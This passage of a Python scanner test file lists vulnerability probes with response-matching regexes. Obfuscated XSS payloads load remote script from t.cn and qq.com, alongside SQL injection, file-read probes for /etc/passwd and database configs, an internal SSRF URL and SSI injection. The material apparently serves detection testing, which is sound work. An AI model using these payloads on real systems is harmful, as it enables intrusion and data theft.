        "target": "tst_xss_scan",
        "encode":  "ALL",
    },

    {
        "case_id": 1200170005,
        "input": "<img src=1 onerror=eval(atob('cz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8vdC5jbi9SVUQ1SkxuJw=='))>",
        "target": "tst_xss_scan",
        "encode":  "YES",
    },

    {
        "case_id": 1200170006,
        "input": "<img src=1 onerror=\"eval(String.fromCharCode(115, 61, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 100, 111, 99, 117, 109, 101, 110, 116, 46, 98, 111, 100, 121, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 41, 59, 115, 46, 115, 114, 99, 61, 39, 104, 116, 116, 112, 58, 47, 47, 116, 46, 99, 110, 47, 82, 85, 68, 53, 74, 76, 110, 39))\">",
        "target": "tst_xss_scan",
        "encode":  "YES",
    },

    {
        "case_id": 1200170007,
        "input": "'\"><img src=1 onerror=\"eval(String.fromCharCode(String.fromCharCode(115, 61, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 100, 111, 99, 117, 109, 101, 110, 116, 46, 98, 111, 100, 121, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 41, 59, 115, 46, 115, 114, 99, 61, 39, 104, 116, 116, 112, 58, 47, 47, 106, 115, 46, 97, 113, 46, 113, 113, 46, 99, 111, 109, 47, 106, 115, 47, 116, 115, 116, 95, 115, 99, 97, 110, 46, 106, 115, 39))\">",
        "target": "tst_xss_scan",
        "encode":  "YES",
    },

    {
        "case_id": 1200170008,
        "input": "'\"><svg/onload=\"eval(atob('cz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8vanMuYXEucXEuY29tL2pzL3RzdF9zY2FuLmpzJw=='))\">",
        "target": "tst_xss_scan",
        "encode":  "ALL",
    },

    {
        "case_id": 1200170009,
        "input": "'\"><script src=\"http://t.cn/RUD5JLn\"></script>",
        "target": "tst_xss_scan",
        "encode":  "YES",
    },

]

joomla_sqlinject_detect_test_cases = [

    {
        "case_id": 1200180001,
        "input": "/index.php?option=com_contenthistory&view=history&item_id=1&type_id=1&list[select]=1%27",
        "target": "500 - You have an error in your SQL syntax;",
        "encode":  "NO",
    },

]

discuz_72_xss_detect_test_cases = [

    {
        "case_id": 1200190001,
        "input": "/admincp.php?infloat=yes&handlekey=123);alert(/1/);//",
        "target": "if\\(\\$\\('return_123\\);alert\\(\\/1\\/\\);\\/\\/'",
        "encode":  "NO",
    },

]

phpcmsv9_any_file_read_detect_test_cases = [

    {
        "case_id": 1200200001,
        "input": "/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../caches/configs/database.php",
        "target": "<\\?php[\\t\\n\\s]+return\\sarray",
        "encode":  "NO",
    },

]

resin_anyfile_read_detect_test_cases = [

    {
        "case_id": 1200260001,
        "input": "/resin-doc/viewfile/?contextpath=/&servletpath=&file=index.jsp",
        "target": "%@\\spage\\ssession=\"false\"\\simport=\"com.caucho.vfs\\.\\*,\\scom.caucho.server.webapp\\.\\*\"",
        "encode":  "NO",
    },

    {
        "case_id": 1200260002,
        "input": "/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd",
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "encode":  "NO",
    },

]


fckeditor_leak_detect_test_cases = [

    {
        "case_id": 1200230001,
        "input": "/fckeditor/editor/fckeditor.html",
        "target": "LoadScript\\( '\\.\\.\\/fckconfig.js' \\)",
        "encode":  "NO",
    },

    {
        "case_id": 1200250001,
        "input": "/fckeditor/editor/fckeditor.html",
        "target": "LoadScript\\( '\\.\\.\\/fckconfig.js' \\)",
        "encode":  "NO",
    },

]

nginx_uri_processing_test_cases = [

    {
        "case_id": 1200270001,
        "input": "/tst.php",
        "target": "nothing",
        "encode":  "NO",
    },

    {
        "case_id": 1200270002,
        "input": "/tst%00.php",
        "target": "nothing",
        "encode":  "NO",
    },

]

git_config_detect_test_cases = [

    {
        "case_id": 1200280001,
        "input": "/.git/config",
        "target": "repositoryformatversion[\\s\\S]*",
        "encode":  "NO",
    },

]

error_message_on_page_test_cases = [

    {
        "case_id": 1200290001,
        "input": "nil",
        "target": "((\\s+at\\s\\w+\\.[\\s\\S]*?\\(\\w+\\.java\\:\\d+\\)\\n){3,})|(SQL[\\s\\S]error[\\s\\S]*)|(\\[IBM\\]\\[CLI Driver\\]\\[DB2\\/.*?\\])|((?:Unknown database '[\\s\\S]*?')|(?:No database selected)|(?:Table '[\\s\\S]*?' doesn't exist)|(?:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[\\s\\S]*?' at line [\\s\\S]*?))|(Exception report[\\s\\S]*message[\\s\\S]*description[\\s\\S]*exception[\\s\\S]*note[\\s\\S]*)|((Warning|Fatal\\serror|Parse\\serror):\\s+[\\s\\S]*\\([^\\)]*\\)\\:\\s[\\s\\S]*?\\sin\\s[\\s\\S]*?\\son\\sline\\s\\d+)|(The error occurred while processing[\\s\\S]*Template: ([\\s\\S]*) <br>)|(The error occurred while processing[\\s\\S]*in the template file ([\\s\\S]*)\\.<\\/p><br>)|(<b>(Warning|Fatal\\serror|Parse\\serror)<\\/b>:\\s+[\\s\\S]*?\\sin\\s<b>[\\s\\S]*?<\\/b>\\son\\sline\\s<b>\\d*?<\\/b><br\\s\\/>)|(<b>Warning<\\/b>:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in <b>[\\s\\S]*?<\\/b> on line <b>[\\s\\S]*?<\\/b>)|(The Error Occurred in <b>([\\s\\S]*): line[\\s\\S]*<\\/b><br>)|(Data type mismatch in criteria expression|Could not update; currently locked by user '[\\s\\S]*?' on machine '[\\s\\S]*?')|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\s\\([^)]*?\\)\\sin\\squery\\sexpression\\s[\\s\\S]*)|(System\\.Data\\.OleDb\\.OleDbException\\:\\sSyntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\&quot; at character \\d+ in\\s<b>[\\s\\S]*<\\/b>)|(<font\\sface=\\\"Arial\\\"\\ssize=2>Syntax\\serror\\s([\\s\\S]*)?in\\squery\\sexpression\\s'([\\s\\S]*)\\.<\\/font>)|(Traceback \\(most recent call last\\):\\s+File\\s\\\")|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror([\\s\\S]*)\\sin\\squery\\sexpression\\s'[\\s\\S]*\\.<br><b>[\\s\\S]*,\\sline\\s\\d+<\\/b><br>)|((\\s+(at)?\\s(org|net|java|com|javax|ruby|sun|hudson|winstone|jpp)\\.[\\w\\.\\$]+\\(.*?:\\d+\\)){5,})|(<title>.*?Exception caught<\\/title>)|(IPWorksASP\\.LDAP.*800a4f70.*\\[335\\]\\s\\(no description\\savailable\\))|(<span><H1>Server Error in '.*?' Application.*<h2>\\s<i>The.*search filter is invalid\\.<\\/i>)|(\\d{4}\\s\\d{2}:\\d{2}:\\d{2} - Generated by MyFaces - for information on disabling or modifying this error-page)|(Failed opening '.*' for inclusion)|(Unknown column '[^']+' in '\\w+ clause')|(org.apache.jasper.JasperException: .*? File .*? not found)|(<b>Warning<\\/b>:.*: Failed opening '.*' for inclusion)|(System.Xml.XPath.XPathException\\:)|(<b>Fatal error<\\/b>:.*: Failed opening required '.*')|(<b>\\sException\\sDetails:\\s<\\/b>System\\.Xml\\.XPath\\.XPathException:\\s'.*'\\shas\\san\\sinvalid\\stoken\\.<br><br>)|(<b>\\sException\\sDetails:\\s<\\/b>System\\.Xml\\.XPath\\.XPathException:\\sThis\\sis\\san\\sunclosed\\sstring\\.<br><br>)|(Servlet\\sError<\\/title>)|(<h1>Servlet\\sError:\\s\\w+?<\\/h1>)|(<head><title>JRun Servlet Error<\\/title><\\/head>)|((?:Unknown database '.*?')|(?:No database selected)|(?:Table '.*?' doesn't exist)|(?:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.*?' at line .*?))|(Exception report.*message.*description.*exception.*note.*)|(<b>(Warning|Fatal\\serror|Parse\\serror)<\\/b>:\\s+.*?\\sin\\s<b>.*?<\\/b>\\son\\sline\\s<b>\\d*?<\\/b><br\\s\\/>)|(<\\/span>\\s(Warning|Fatal\\serror|Parse\\serror):\\s+.*?\\sin\\s.*?\\son\\sline\\s<i>\\d*?<\\/i>)|(<title>Invalid\\sfile\\sname\\sfor\\smonitoring:\\s'([^']*)'\\.\\sFile\\snames\\sfor\\smonitoring\\smust\\shave\\sabsolute\\spaths\\,\\sand\\sno\\swildcards\\.<\\/title>)|(The error occurred while processing.*in the template file.*\\.<\\/p><br>)|(The error occurred while processing.*Template:.*<br>)|(The Error Occurred in <b>.*: line.*<\\/b><br>)|(Query\\sfailed\\:\\sERROR\\:\\scolumn\\s\\\"[^\\\"]*\\\"\\sdoes\\snot\\sexist\\sLINE\\s\\d)|(Query\\sfailed\\:\\sERROR\\:\\s+unterminated quoted string at or near)|(You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '[^']*' at line \\d)|(Unclosed\\squotation\\smark\\safter\\sthe\\scharacter\\sstring\\s'[^']*')|(<b>Warning<\\/b>:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in <b>.*?<\\/b> on line <b>.*?<\\/b>)|(<font style=\\\"COLOR: black; FONT: 8pt\\/11pt verdana\\\">\\s+(\\[Macromedia\\]\\[SQLServer\\sJDBC\\sDriver\\]\\[SQLServer\\]|Syntax\\serror\\sin\\sstring\\sin\\squery\\sexpression\\s))|(Data type mismatch in criteria expression|Could not update; currently locked by user '.*?' on machine '.*?')|(System\\.Data\\.OleDb\\..*)|(System\\.InvalidOperationException.*)|(<b>Warning<\\/b>:\\s\\spg_exec\\(\\)\\s\\[\\<a\\shref='function.pg\\-exec'\\>function\\.pg-exec\\<\\/a>\\]\\:\\sQuery failed:\\sERROR:\\s\\ssyntax error at or near \\&quot\\;\\&quot; at character \\d+ in\\s<b>.*<\\/b>)|(<font\\sface=\\\"Arial\\\"\\ssize=2>Syntax\\serror\\s.*?in\\squery\\sexpression\\s'.*\\.<\\/font>)|(Microsoft\\sJET\\sDatabase\\sEngine\\s\\([^\\)]*\\)<br>Syntax\\serror.*\\sin\\squery\\sexpression\\s'.*\\.<br><b>.*,\\sline\\s\\d+<\\/b><br>)|(<h2>\\s<i>Syntax\\serror\\s(\\([^\\)]*\\))?(in\\sstring)?\\sin\\squery\\sexpression\\s'[^\\.]*\\.<\\/i>\\s<\\/h2><\\/span>)|(ORA-\\d{4,5}:\\s)|('[^']*'\\sis\\snull\\sor\\snot\\san\\sobject)|(Syntax error: Missing operand after '[^']*' operator)|(pg_query\\(\\)[:]*\\squery\\sfailed:\\serror:\\s)|((Incorrect\\ssyntax\\snear\\s'[^']*')\\/<th\\salign='left'\\sbgcolor='#[a-zA-Z0-9]+'\\scolspan=\\\"[a-zA-Z0-9]+\\\"><span\\sstyle='background-color:\\s#[a-zA-Z0-9]+;\\scolor:\\s#[a-zA-Z0-9]+;\\sfont-size:\\sx-large;'>\\(\\s\\!\\s\\)<\\/span>\\s+(.*?on\\s+line\\s<i>\\d+<\\/i>)<\\/th>)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\) expects parameter \\d+ to be resource, \\w+ given in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|((<b>)?Warning(<\\/b>)?:\\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\\(\\): supplied argument is not a valid MySQL result resource in (<b>)?.*?(<\\/b>)? on line (<b>)?\\d+(<\\/b>)?)|(java.io.FileNotFoundException:)|(<b>Warning<\\/b>:  (file_get_contents[^\\r\\n]*(\\[<a href='function.file-get-contents'>function.file-get-contents<\\/a>\\])?|fopen[^\\r\\n]*( \\[<a href='function.fopen'>function.fopen<\\/a>\\])?): failed to open stream: (No such file or directory|Invalid argument|(HTTP request failed! .*)) in <b>.*?<\\/b> on line <b>.*?<\\/b>)|(java\\.io\\.FileNotFoundException:\\s)|(java.io.FileNotFoundException:\\shttps)|(<b>(Warning|Fatal\\serror)<\\/b>:(?:(?:\\s*?main\\(\\))|(?:\\s*?(include|include_once|require|require_once)\\(\\) \\[<a href='function\\.(include|require)'>function\\.(include|require)<\\/a>\\])): Failed opening (required\\s)?)|(Failed opening[^\\r\\n]*for inclusion)|(The requested resource\\s[^\\r\\n]*is not available)|(org.apache.jasper.JasperException: .*? File .*? not found)|(java\\.net\\.MalformedURLException:\\sno protocol:\\s)|(java\\.lang\\.IllegalArgumentException:\\sURI has an authority component)|(<b>Warning<\\/b>:[^\\r\\n]*: Failed opening)|(FileNotFoundException:\\sCould\\snot\\sfind\\sfile\\s)|(java.io.FileNotFoundException:\\s)|(Warning: fopen)|(Failed opening required\\s)|(<b>Fatal error<\\/b>:[^\\r\\n]*: Failed opening required)",
        "encode":  "NO",
    },

]

joomla_unserialize_rce_test_cases = [

    {
        "case_id": 1200310001,
        "input": "nothing",
        "target": "46589dbc497478193d0fc922e5421196",
        "encode":  "NO",
    },

]

idea_workspace_detect_test_cases = [

    {
        "case_id": 1200320002,
        "input": ".idea/workspace.xml",
        "target": "<project version=\"\\w+\">",
        "encode":  "NO",
    },

]

core_file_detect_test_cases = [

    {
        "case_id": 1200350001,
        "input": "/core",
        "target": "^ELF",
        "encode":  "NO",
    },

]

discuz_patch_no_update_test_cases = [

    {
        "case_id": 1200360001,
        "input": "/static/js/bbcode.js#[DX-20150122-01]",
        "target": "[^/\\*]str = str\\.replace\\(/\\\\\\[font=\\(\\[\\^\\\\\\[\\\\\\<\\]\\+\\?\\)\\\\\\]/ig, '\\<font face=\\\"\\$1\\\"\\>'\\);",
        "encode":  "NO",
    },

    {
        "case_id": 1200360002,
        "input": "/static/js/common_extra.js#[DX-20150122-02]",
        "target": "[^/\\*]\\$\\(menuid \\+ '_img'\\)\\.innerHTML = '\\<img id=\\\"' \\+ zoomid \\+ '\\\" src=",
        "encode":  "NO",
    },

    {
        "case_id": 1200360003,
        "input": "/static/js/forum_viewthread.js#[DX-20150330-02]",
        "target": "[^/\\*]for\\(i = 1;i \\< reloadpids\\.length;i\\+\\+\\)",
        "encode":  "NO",
    },

    {
        "case_id": 1200360004,
        "input": "/static/js/bbcode.js#[DX-20150330-04]",
        "target": "[^/\\*]str = str\\.replace\\(/\\\\\\[email=\\(\\.\\[\\^\\\\\\[\\]\\*\\)\\\\\\]\\(\\.\\*\\?\\)\\\\\\[\\\\\\/email\\\\\\]/ig, '\\<a href=\\\"mailto:\\$1\\\" target=\\\"_blank\\\"\\>\\$2\\</a\\>'\\);",
        "encode":  "NO",
    },

    {
        "case_id": 1200360005,
        "input": "/template/default/forum/forumdisplay.htm#[DX-20150330-05]",
        "target": "[^/\\*]postcontent \\+= '\\<dd\\>' \\+ newpostlist\\[i\\]\\.message \\+ '\\</dd\\>';",
        "encode":  "NO",
    },

    {
        "case_id": 1200360006,
        "input": "/static/js/bbcode.js#[DX-20150722-01]",
        "target": "[^/\\*]str = str\\.replace\\(\\/\\\\\\[email\\\\\\]\\(\\.\\*\\?\\)\\\\\\[\\\\\\/email\\\\\\]\\/ig, '\\<a href=\\\"mailto:\\$1\\\"\\>\\$1\\<\\/a\\>'\\)",
        "encode":  "NO",
    },

    {
        "case_id": 1200360007,
        "input": "/forum.php?mod=ajax&action=downremoteimg&message=forum.php?mod=ajax&action=downremoteimg&message=[img]http://10.153.138.81/ssrf/ssrf.jpg[/img]#[DX-20151109-01]",
        "target": "parent.updateDownImageList\\(\\'\\[attachimg\\](\\d+)\\[\\\\\\/attachimg\\]\\'\\)",
        "encode":  "NO",
    },

]

ssi_inject_test_cases = [

    {
        "case_id": 1200370001,
        "input": "<!--%23%20echo%20var=\"name\"%20default=\"tst_ssi_test\"%20-->",
        "target": "tst_ssi_test",
        "encode":  "NO",
    },

]



if __name__ == '__main__':
    print sql_inject_detect_err_msg_test_cases



